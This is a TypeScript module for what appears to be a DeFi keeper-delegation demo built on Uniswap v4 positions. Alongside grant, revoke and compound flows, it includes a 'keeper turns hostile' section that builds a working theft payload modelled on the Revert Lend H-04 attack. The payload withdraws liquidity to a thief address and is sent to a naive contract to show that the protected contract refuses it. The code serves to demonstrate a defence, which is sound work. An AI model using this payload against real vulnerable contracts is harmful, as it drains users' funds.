import {
  encodeAbiParameters,
  encodePacked,
  parseAbiItem,
  toFunctionSelector,
  type Address,
  type Hex,
  type WalletClient
} from "viem";
import {publicClient, envoyageAbi, posmAbi} from "./envoyage";
import {parseEventLogs} from "viem";
import {ENVOYAGE, POSITION_MANAGER, CHAIN} from "./config";

// ── owner ─────────────────────────────────────────────────────────────────────

export type Terms = {
  keeper: Address;
  tokenId: bigint;
  maxFeeBps: number;
  feeRecipient: Address;
  minInterval: bigint;
  expiry: bigint;
};

export async function approvePosition(w: WalletClient, tokenId: bigint, to: Address): Promise<Hex> {
  const hash = await w.writeContract({
    account: w.account!,
    chain: CHAIN,
    address: POSITION_MANAGER,
    abi: [parseAbiItem("function approve(address to, uint256 tokenId)")],
    functionName: "approve",
    args: [to, tokenId]
  });
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

export async function grant(w: WalletClient, t: Terms): Promise<{hash: Hex; mandateId: bigint}> {
  // Simulated first so a refusal surfaces as a named error before any gas is spent.
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE,
    abi: envoyageAbi,
    functionName: "grant",
    args: [
      {
        keeper: t.keeper,
        // Ignored by the contract, which overwrites it with msg.sender. Left visible
        // because the fact that it is ignored is the point.
        grantor: "0x0000000000000000000000000000000000000000",
        tokenId: t.tokenId,
        maxFeeBps: t.maxFeeBps,
        feeRecipient: t.feeRecipient,
        expiry: t.expiry,
        minInterval: t.minInterval,
        lastCall: 0n,
        compoundAllowed: true
      }
    ]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  const receipt = await publicClient.waitForTransactionReceipt({hash});
  // The realised id comes from the emitted event, never from the simulation's
  // return value — that was nextMandateId at simulation time and a racing grant
  // would make it wrong. (CLAUDE.md: a simulated value is not a realised one.)
  const events = parseEventLogs({abi: envoyageAbi, logs: receipt.logs, eventName: "MandateGranted"});
  const mandateId = (events[0] as {args: {id: bigint}} | undefined)?.args.id;
  if (mandateId === undefined) throw new Error("grant landed but emitted no MandateGranted");
  return {hash, mandateId};
}

export async function revoke(w: WalletClient, mandateId: bigint): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE,
    abi: envoyageAbi,
    functionName: "revoke",
    args: [mandateId]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

// ── keeper ────────────────────────────────────────────────────────────────────

export async function compound(w: WalletClient, mandateId: bigint): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE,
    abi: envoyageAbi,
    functionName: "compound",
    args: [mandateId, 0n]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

// ── keeper turns hostile ──────────────────────────────────────────────────────

/// Uniswap v4 action opcodes, from v4-periphery/src/libraries/Actions.sol.
const DECREASE_LIQUIDITY = 0x01;
const TAKE_PAIR = 0x11;

/// The Revert Lend H-04 attack, byte for byte what test/replay/ExploitReplay.t.sol
/// sends: pull liquidity out of the position, deliver both tokens to `thief`.
///
/// This is built ONCE and sent to both targets unchanged. If the two calls carried
/// different calldata the comparison would be rigged; the only variable is the
/// contract on the receiving end.
export function buildTheftActions(tokenId: bigint, currency0: Address, currency1: Address, thief: Address, liquidity: bigint): Hex {
  const actions = encodePacked(["uint8", "uint8"], [DECREASE_LIQUIDITY, TAKE_PAIR]);
  const params: Hex[] = [
    encodeAbiParameters(
      [{type: "uint256"}, {type: "uint256"}, {type: "uint128"}, {type: "uint128"}, {type: "bytes"}],
      [tokenId, liquidity, 0n, 0n, "0x"]
    ),
    encodeAbiParameters([{type: "address"}, {type: "address"}, {type: "address"}], [currency0, currency1, thief])
  ];
  return encodeAbiParameters([{type: "bytes"}, {type: "bytes[]"}], [actions, params]);
}

export const NAIVE_EXECUTE = parseAbiItem("function execute(uint256 tokenId, bytes actions)");

/// Sends the theft to the naive contract. Expected to SUCCEED — that is the point.
export async function stealViaNaive(w: WalletClient, naive: Address, tokenId: bigint, actions: Hex): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: naive,
    abi: [NAIVE_EXECUTE],
    functionName: "execute",
    args: [tokenId, actions]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

/// The selector for the naive contract's entrypoint, and whether Envoyage's ABI has
/// any function with it. Computed once, defensively — a throw here must not take the
/// evidence down with it.
function theftSelector(): {selector: Hex; existsOnAbi: boolean} {
  const selector = toFunctionSelector("execute(uint256,bytes)");
  let existsOnAbi = false;
  for (const f of envoyageAbi) {
    if (f.type !== "function") continue;
    try {
      if (toFunctionSelector(f as never) === selector) existsOnAbi = true;
    } catch {
      /* a non-function-shaped entry can't match; ignore */
    }
  }
  return {selector, existsOnAbi};
}

function theftCalldata(tokenId: bigint, actions: Hex): Hex {
  const {selector} = theftSelector();
  return (selector + encodeAbiParameters([{type: "uint256"}, {type: "bytes"}], [tokenId, actions]).slice(2)) as Hex;
}

/// Preflight, via eth_call: no wallet, no gas. Renders WHY before anyone signs, the
/// same way canCompound explains a refusal before compound is sent.
export async function previewTheftAgainstEnvoyage(tokenId: bigint, actions: Hex, from: Address): Promise<{selector: Hex; existsOnAbi: boolean; reverted: boolean; detail: string}> {
  const {selector, existsOnAbi} = theftSelector();
  try {
    await publicClient.call({account: from, to: ENVOYAGE, data: theftCalldata(tokenId, actions)});
    return {selector, existsOnAbi, reverted: false, detail: "call did not revert"};
  } catch {
    // The revert data is empty: the dispatcher found no selector and reverted before
    // any code ran. That empty revert is the evidence, so its shape is what we report,
    // not viem's exception text.
    return {selector, existsOnAbi, reverted: true, detail: "reverted with no data — no function matched the selector"};
  }
}

/// The SAME calldata as a REAL transaction from the same wallet. It reverts on chain
/// and burns gas, leaving a FAILED transaction on Etherscan beside the successful
/// theft against the naive contract. An eth_call would only prove the app chose not
/// to send it; a mined failure proves the chain refused it.
export async function stealViaEnvoyage(w: WalletClient, tokenId: bigint, actions: Hex): Promise<{hash: Hex; status: "success" | "reverted"}> {
  const hash = await w.sendTransaction({
    account: w.account!,
    chain: CHAIN,
    to: ENVOYAGE,
    data: theftCalldata(tokenId, actions),
    // Fixed gas: the wallet cannot estimate a call it predicts will revert, and
    // without this it refuses to send at all, so there would be no failed tx to show.
    gas: 120_000n
  });
  const receipt = await publicClient.waitForTransactionReceipt({hash});
  return {hash, status: receipt.status};
}

// ── reads used by the flows ───────────────────────────────────────────────────

export async function ownerOf(tokenId: bigint): Promise<Address | null> {
  return (await publicClient
    .readContract({address: POSITION_MANAGER, abi: posmAbi, functionName: "ownerOf", args: [tokenId]})
    .catch(() => null)) as Address | null;
}

export async function positionLiquidity(tokenId: bigint): Promise<bigint> {
  return (await publicClient.readContract({
    address: POSITION_MANAGER,
    abi: [parseAbiItem("function getPositionLiquidity(uint256 tokenId) view returns (uint128)")],
    functionName: "getPositionLiquidity",
    args: [tokenId]
  })) as bigint;
}

export async function positionCurrencies(tokenId: bigint): Promise<{currency0: Address; currency1: Address}> {
  const r = (await publicClient.readContract({
    address: POSITION_MANAGER,
    abi: [
      parseAbiItem(
        "function getPoolAndPositionInfo(uint256 tokenId) view returns ((address currency0, address currency1, uint24 fee, int24 tickSpacing, address hooks) poolKey, uint256 info)"
      )
    ],
    functionName: "getPoolAndPositionInfo",
    args: [tokenId]
  })) as unknown as readonly [{currency0: Address; currency1: Address}, bigint];
  return {currency0: r[0].currency0, currency1: r[0].currency1};
}

export async function erc20Balance(token: Address, who: Address): Promise<bigint> {
  return (await publicClient.readContract({
    address: token,
    abi: [parseAbiItem("function balanceOf(address) view returns (uint256)")],
    functionName: "balanceOf",
    args: [who]
  })) as bigint;
}
